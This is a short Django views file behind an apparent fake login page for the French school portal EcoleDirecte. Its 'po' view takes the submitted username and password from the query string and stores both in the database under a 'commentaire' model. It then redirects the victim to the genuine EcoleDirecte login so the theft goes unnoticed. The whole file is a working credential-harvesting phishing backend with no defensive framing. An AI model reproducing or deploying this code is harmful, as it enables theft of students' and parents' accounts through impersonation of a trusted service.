from django.shortcuts import render, redirect
from .models import commentaire
from django.template import loader
from django.http import HttpResponse
from django.utils import timezone
import webbrowser



def index(request):
    
    return render(request, 'EcoleDirecte.html')

def po(request):
    
    ne = request.GET['post']
    nope = request.GET['mdp']
    
    
    if ne == '':
        return render(request,'EcoleDirecte.html',
                      {'error_message': "Identifiant invalide", })

                                      
    if nope == '':
        return render(request,'EcoleDirecte.html',
                       {'error_message': "Mot de passe invalide",

        })
    
    
    m = commentaire(commentaire_text=ne, pub_date=timezone.now())
    n = commentaire(commentaire_text=nope, pub_date=timezone.now())
    m.save()
    n.save()
    rep = redirect('https://www.ecoledirecte.com/login')
    return rep

    
    
    #return render(request,'polls/po.html')
